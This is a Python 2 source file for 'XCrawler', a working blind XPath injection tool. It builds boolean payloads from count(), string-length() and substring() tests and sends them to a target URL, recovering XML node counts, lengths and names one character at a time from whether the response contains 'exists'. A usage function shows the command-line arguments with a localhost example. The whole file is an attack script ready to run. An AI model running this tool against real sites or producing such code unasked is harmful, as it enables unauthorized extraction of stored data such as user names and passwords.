#!/usr/bin/env python
import argparse
import string
import urllib
import urllib2
from xml.dom.minidom import *


class XCrawler(object):
    MAX_RETRY = 4

    strTrue = " and '1'='1"
    strFalse = " and '1'='0"
    strCount = "' and count({})={}"
    strLength = "' and string-length({})={}"
    strSub = "' and substring({},1,{}) = '{}'"
    strConfirm = "' exists"
    charList = string.ascii_letters + string.digits

    def __init__(self):
        args = self.set_args()
        self.url = args.url
        self.xml = Document()
        self.mutex = None
        self.nb_thread = int(args.nbt) if args.nbt is not None else None
        self.query = args.query
        self.sure_value = args.v

    def count_node(self, path):
        count = 0
        for i in range(0, 2000):
            payload = self.make_payload(self.strCount.format(path, i))
            if self.get_request(payload):
                count = i
                break
        return count

    def find_length(self, path):
        length = 0
        for i in range(1, 100):
            payload = self.make_payload(self.strLength.format(path, i))
            if self.get_request(payload):
                length = i
                break
        return length

    def find_name(self, path, length):
        name = ""
        for i in range(1, length + 1):
            for char in self.charList:
                payload = self.make_payload(self.strSub.format(path, i, name + char))
                if self.get_request(payload):
                    name += char
                    break
        return name

    def get_request(self, payload):
        retry = 0
        html = ""
        while retry < self.MAX_RETRY:
            try:
                response = urllib2.urlopen(self.url + "?" + payload)
                html = response.read()
                retry = self.MAX_RETRY
            except Exception, e:
                retry += 1
                print "Retry #{}\n".format(retry)
                print e
        return self.strConfirm in html

    def make_payload(self, step):
        return urllib.urlencode({self.query: self.sure_value + step + self.strTrue})

    def set_args(self):
        parser = argparse.ArgumentParser()
        parser.add_argument('-url')
        parser.add_argument('-nbt')
        parser.add_argument('-query')
        parser.add_argument('-v')
        return parser.parse_args()


def usage(version):
    print "USAGE: jython {}.py -url \"URL\" -query \"query\" -v \"sure value\" -nbt X".format(version)
    print "\t-url: The host's url"
    print "\t-query: The query used for the injection"
    print "\t-v: A sure value that will return true"
    print "\t-nbt: Number of Workers to work with (not necessary for xcrawler_seq)"
    print "Example: jython {}.py -url \"http://localhost:8080/index.php\" -query \"query\" -v \"admin\" -nbt 4"\
        .format(version)
